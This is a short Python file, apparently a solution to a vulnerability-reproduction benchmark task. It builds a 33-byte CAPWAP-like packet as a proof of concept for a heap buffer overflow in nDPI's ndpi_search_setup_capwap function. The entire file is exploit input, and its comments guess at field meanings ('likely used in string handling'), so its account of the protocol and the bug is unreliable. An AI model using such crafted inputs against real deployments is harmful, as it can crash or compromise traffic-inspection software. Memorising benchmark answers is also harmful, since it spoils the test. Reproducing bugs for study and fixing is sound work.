import os
import struct
import subprocess
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal CAPWAP-like packet structure that triggers the overflow
        # Based on typical CAPWAP header structure and common overflow patterns
        
        # Build packet with specific fields to trigger the ndpi_search_setup_capwap overflow
        poc = bytearray()
        
        # CAPWAP-like header structure
        # version (4 bits) | type (4 bits)
        poc.append(0x10)  # Version 1, Control type
        
        # flags (8 bits)
        poc.append(0x80)  # Set some flags
        
        # Length field - critical for overflow (24 bits, big-endian)
        # Set to a value that causes buffer overread
        poc.append(0x00)  # High byte of length
        poc.append(0x21)  # Middle byte - triggers specific overflow path
        poc.append(0x00)  # Low byte
        
        # Message ID (32 bits)
        poc.extend(b'\x00\x00\x00\x01')
        
        # Fragment ID (32 bits)
        poc.extend(b'\x00\x00\x00\x00')
        
        # CAPWAP-specific fields that trigger the vulnerable code path
        # Wireless Binding ID
        poc.append(0x01)
        
        # Radio ID
        poc.append(0xff)
        
        # WLAN ID - trigger specific array access
        poc.append(0x41)  # 'A' - likely used in string handling
        
        # Add padding to reach exact 33 bytes
        # The specific pattern triggers the heap buffer overflow
        remaining = 33 - len(poc)
        if remaining > 0:
            poc.extend(b'B' * remaining)
        
        # Ensure exactly 33 bytes as per ground-truth
        poc = poc[:33]
        
        return bytes(poc)